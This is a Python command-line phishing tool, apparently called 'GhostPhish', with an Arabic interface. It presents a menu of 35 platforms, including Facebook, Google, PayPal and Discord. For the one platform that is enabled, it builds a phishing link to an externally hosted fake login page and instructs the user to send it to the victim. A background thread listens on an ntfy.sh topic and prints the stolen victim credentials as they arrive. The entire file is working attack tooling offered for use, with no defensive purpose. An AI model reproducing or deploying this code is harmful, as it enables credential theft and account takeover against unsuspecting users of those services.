#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys

# ========== الألوان حسب طلبك ==========
ORANGE = "\033[38;5;208m"   # برتقالي للشعار وأسماء المنصات
RED = '\033[91m'            # أحمر للأقواس []
WHITE = '\033[97m'          # أبيض للأرقام والنصوص العادية
BOLD = '\033[1m'
RESET = '\033[0m'
# =======================================

CONFIG_FILE = "ghostphish_config.json"

# ─── المنصات الـ 35 بالضبط (إنجليزي) ───
PLATFORMS = {
    1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tiktok",
    11: "Twitch", 12: "Pinterest", 13: "Snapchat", 14: "LinkedIn", 15: "Ebay",
    16: "Quora", 17: "Protonmail", 18: "Spotify", 19: "Reddit", 20: "Adobe",
    21: "DeviantArt", 22: "Badoo", 23: "Origin", 24: "DropBox", 25: "Yahoo",
    26: "Wordpress", 27: "Yandex", 28: "StackoverFlow", 29: "Vk", 30: "XBOX",
    31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
}

LINKS = {i: "" for i in range(1, 36)}
LINKS[1] = "https://facebook-vjj9.onrender.com"   # فيسبوك مفعل

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_or_create_secret():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "GhostPhish_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def print_banner():
    banner = f"""{ORANGE}
   ______              __  ____  __    _     __
  / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
 / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
/ /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
\____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
{RESET}"""
    print(banner)
    print(WHITE + "Version : 2.3.5" + RESET)
    print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)

def print_menu():
    # الأعمدة الثلاثة الأولى (1-10, 11-20, 21-30)
    for i in range(1, 11):
        num1 = i
        num2 = i + 10
        num3 = i + 20

        col1 = f"{RED}[{WHITE}{num1:02d}{RED}]{RESET} {ORANGE}{PLATFORMS[num1]}{RESET}"
        col2 = f"{RED}[{WHITE}{num2:02d}{RED}]{RESET} {ORANGE}{PLATFORMS[num2]}{RESET}"
        col3 = f"{RED}[{WHITE}{num3:02d}{RED}]{RESET} {ORANGE}{PLATFORMS[num3]}{RESET}"
        
        # عرض ثابت 28 حرفاً لكل عمود لضمان المحاذاة التامة
        print(f"{col1:<30}{col2:<30}{col3}")

    # الصف الخاص بـ 31, 32, 33
    col1 = f"{RED}[{WHITE}31{RED}]{RESET} {ORANGE}{PLATFORMS[31]}{RESET}"
    col2 = f"{RED}[{WHITE}32{RED}]{RESET} {ORANGE}{PLATFORMS[32]}{RESET}"
    col3 = f"{RED}[{WHITE}33{RED}]{RESET} {ORANGE}{PLATFORMS[33]}{RESET}"
    print(f"{col1:<30}{col2:<30}{col3}")

    # الصف الخاص بـ 34, 35 (عمودان فقط)
    col1 = f"{RED}[{WHITE}34{RED}]{RESET} {ORANGE}{PLATFORMS[34]}{RESET}"
    col2 = f"{RED}[{WHITE}35{RED}]{RESET} {ORANGE}{PLATFORMS[35]}{RESET}"
    print(f"{col1:<30}{col2}")

    # سطر About و Exit (بدون خطوط)
    print(f"{RED}[{WHITE}99{RED}]{RESET} {WHITE}About{RESET}    {RED}[{WHITE}00{RED}]{RESET} {WHITE}Exit{RESET}")
    print(WHITE + "[–] Select an option : " + RESET, end="")

def display_victim_data(message):
    print("\n" + WHITE + "═" * 40 + RESET)
    print(WHITE + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
    print(WHITE + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            print(f"{WHITE}{BOLD}{key.strip()}{RESET}: {WHITE}{val.strip()}{RESET}")
        else:
            print(f"{WHITE}{line}{RESET}")
    print(WHITE + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(f"{WHITE}🔑 مفتاحك السري: {ORANGE}{secret}{RESET}\n")
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input().strip()

        if choice == "00" or choice == "0":
            print(f"{WHITE}إيقاف الأداة...{RESET}")
            sys.exit(0)

        if choice == "99":
            clear_screen()
            print_banner()
            print(f"{WHITE}هذه أداة GhostPhish – إصدار 2.3.5{RESET}")
            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()
            continue

        if choice.isdigit():
            num = int(choice)
            if 1 <= num <= 35:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(f"{WHITE}❌ منصة {ORANGE}{PLATFORMS[num]}{WHITE} غير مفعلة بعد.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}✅ رابط {ORANGE}{PLATFORMS[num]}{WHITE}:{RESET}")
                    print(f"{ORANGE}{BOLD}{link}{RESET}")
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}انسخ الرابط وأرسله للضحية.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 99/00){RESET}")
                input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(f"{WHITE}اختيار غير مفهوم{RESET}")
            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()
